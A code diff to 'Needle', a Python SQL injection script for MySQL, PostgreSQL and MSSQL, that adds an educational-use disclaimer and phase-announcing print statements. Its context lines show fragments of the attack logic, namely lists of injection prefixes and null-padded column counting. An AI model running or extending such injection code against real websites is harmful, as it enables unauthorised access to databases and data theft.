@@ -4,6 +4,8 @@
 Needle is a python3 script which performs sql injection. It currently supports
 mysql, postgresql and mssql injection.
 
+***Needle was created for educational purposes. Do NOT use it for illegal purposes.***
+
 Copyright © 2018 Konstantinos Sarantopoulos
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
@@ -98,6 +100,7 @@ for key, value in parameters.items():
 #---sql injection---
 print ("\n---Needle started---")
 #check for mysql injection
+print ("---attempting mysql injection---")
 for injection in "'", '"', "", "')", '")', ")":
 	if injection == "":
 		print ("attempting mysql empty injection...", end = " ")
@@ -121,6 +124,7 @@ for injection in "'", '"', "", "')", '")', ")":
 	else:
 		print ("unsuccessful")
 #check for mssql injection
+print ("---attempting mssql injection---")
 for injection in "'", '"', "", "')", '")', ")":
 	if server != 0:
 		break
@@ -178,6 +182,7 @@ if server in ["mysql", "mssql"]:
 		num_col += 1
 		j += ",null"
 #check for postgresql injection and find the number of columns presented per result
+print ("---attempting postgresql injection---")
 for injection in "'", "", "')", ')':
 	if server != 0:
 		break
